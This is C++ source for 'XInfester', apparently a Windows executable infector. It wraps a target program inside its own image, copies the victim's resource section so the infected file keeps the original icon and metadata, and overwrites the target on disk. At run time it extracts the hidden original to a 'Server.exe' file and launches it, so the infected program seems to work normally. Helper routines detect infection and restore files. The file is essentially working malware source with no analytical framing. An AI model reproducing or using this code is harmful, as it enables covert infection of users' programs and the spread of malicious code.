#include "../inc/XInfester.h"

const char *GetLocalAppFilePath()
{
	static char FilePath[MAX_PATH+1]= {0};
	char *p = NULL;
	GetModuleFileName(NULL, FilePath, sizeof(FilePath)); //Get current application directory path
	
	if(p=strrchr(FilePath, '\\'))						                 
	*p='\0';
	
	return FilePath;
}

const char *GetLocalAppFilename()
{
	static char FileName[MAX_PATH+1]= {0};
	GetModuleFileName(NULL, FileName, sizeof(FileName)); //Get current application fullName
	return FileName;
}


const char *GetLocalAppInfestedFilename()
{
	static char FileName[MAX_PATH+1]= {0};
	char *p = NULL;
	GetModuleFileName(NULL, FileName, sizeof(FileName)); //Get current application fullName
	
	if(p=strrchr(FileName, '.'))						                 
	*p='\0';

	strcat(FileName,"Server.exe");
	
	return FileName;
}



size_t GetfileSize(const char *FileName)
{
	FILE *pf;
	size_t Size;
	if (pf=fopen(FileName,"rb"))
	{
		fseek(pf,0,SEEK_END);
		Size=ftell(pf);
		fclose(pf);
		return Size;
	}
	
	return 0;  //Error;
}


DWORD vTemp_NewResRVAOffset;
PEStructure *vTemp_DestPE;

void ResourcesFixer(WORD *id,wchar_t *Name,DWORD length,DWORD *offsetToDataEnter,DWORD *size1,DWORD *DataRVA,void *Buffer)
{
	(*DataRVA)=vTemp_DestPE->RVA_To_FOA(*DataRVA)+vTemp_NewResRVAOffset;
}



BOOL XInfester_InfectFile( const char *pDestFileName )
{
	PEStructure __Dest,__Final;
	FILE *Destfp=NULL;

	size_t SelfFileSize;
	size_t DestFileSize;


	if (!(SelfFileSize=GetfileSize(GetLocalAppFilename())))
	{
		return FALSE;
	}

	if (!(DestFileSize=GetfileSize(pDestFileName)))
	{
		return FALSE;
	}

	//Checkout if the file has been infested.
	if (!__Dest.Load_PE_File(pDestFileName))
	{
		goto _ERR;
	}

	if(!__Dest.GetImageRootResourceDirectoryPointer())
	{
		goto _ERR;
	}

	for (int i=0;i<__Dest.GetSectionCount();i++)
	{
		if (strcmp(__Dest.GetSectionName(i),XINFESTED_SOURCE_SECTION_STRING)==0)
		{
			__Dest.free();
			return TRUE;
		}
	}
	

	if(!__Final.Load_PE_File(GetLocalAppFilename()))
		goto _ERR;


	for (int i=0;i<__Final.GetSectionCount();i++)
	{
		if (strcmp(__Final.GetSectionName(i),XINFESTED_SOURCE_SECTION_STRING)==0)
		{
			//remove ".xinf" & resource section
			if(__Final.RemoveLastSection()&&
			__Final.RemoveLastSection())
			{
				break;
			}
			else
			{
				goto _ERR;
			}
		}
	}

	
	//Copy destPE resource section
	DWORD newResourceRVA;

	if (__Dest.GetDirectorySize(2)==0)
	{
		goto _ERR;
	}

	if(!__Final.AddSection
		(
		0x40000040,
		(char *)__Dest.GetSectionName(__Dest.GetResourceDirctorySectionIndex()),
		__Dest.GetDirectorySize(2),
		newResourceRVA,
		__Dest.GetDirectoryDataBufferPointer(2)
		)
		)
	{
		goto _ERR;
	}

	DWORD HostRVA;
	//Copy host file to section
	if (!__Final.AddSection
		(
		0x40000040,
		XINFESTED_SOURCE_SECTION_STRING,
		__Dest.GetImageSize(),
		HostRVA,
		__Dest.ImagePointer(0)
		)
	)
	{
		goto _ERR;
	}

	//Redirect resource section
	__Final.GetImageDirectory(2)->VirtualAddress=newResourceRVA;
	__Final.GetImageDirectory(2)->Size=__Dest.GetDirectorySize(2);

	//
	vTemp_NewResRVAOffset=HostRVA;
	vTemp_DestPE=&__Dest;

	if(__Final.GetImageRootResourceDirectoryPointer())
	__Final.EnumImageResourceData(__Final.GetImageRootResourceDirectoryPointer(),ResourcesFixer);
	else
	goto _ERR;

	if(!__Final.Dump(pDestFileName))
		goto _ERR;

	//Files open
	__Dest.free();
	__Final.free();
	return TRUE;
_ERR:
	__Dest.free();
	__Final.free();
	return FALSE;
}

void XInfester_Run()
{
// 	STARTUPINFO si;
// 	PROCESS_INFORMATION pi;

	PEStructure _SelfPE;
	if (!_SelfPE.Load_PE_File(GetLocalAppFilename()))
	{
		return;
	}



	for (int i=0;i<_SelfPE.GetSectionCount();i++)
	{
		if (strcmp(_SelfPE.GetSectionName(i),".xinf")==0)
		{
			if(_SelfPE.DumpMemoryToFile(GetLocalAppInfestedFilename(),
				_SelfPE.GetSectionBufferPointer(i),
				_SelfPE.GetSectionRawSize(i)
				))
			{
				WinExec(GetLocalAppInfestedFilename(),SW_SHOWNORMAL);
				//CreateProcess(GetLocalAppInfestedFilename(), "", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
				return;
			}
		}
	}
}

BOOL XInfester_RestoreFile(const char *pDestFileName)
{
	PEStructure pDest;
	if(!pDest.Load_PE_File(pDestFileName))
		return FALSE;

	for (int i=0;i<pDest.GetSectionCount();i++)
	{
		if (strcmp(pDest.GetSectionName(i),XINFESTED_SOURCE_SECTION_STRING)==0)
		{
			if(pDest.DumpMemoryToFile(pDestFileName,pDest.GetSectionBufferPointer(i),pDest.GetSectionRawSize(i)))
			return TRUE;
			else
			{
				printf("Error restore:%s\n",pDestFileName);
				return FALSE;
			}
		}
	}
	return FALSE;
}

BOOL XInfester_IsFileInfected(const char *pDestFileName)
{
	PEStructure pDest;
	if(!pDest.Load_PE_File(pDestFileName))
		return FALSE;

	for (int i=0;i<pDest.GetSectionCount();i++)
	{
		if (strcmp(pDest.GetSectionName(i),XINFESTED_SOURCE_SECTION_STRING)==0)
		{
				pDest.free();
				return TRUE;
		}
	}
	pDest.free();
	return FALSE;
}
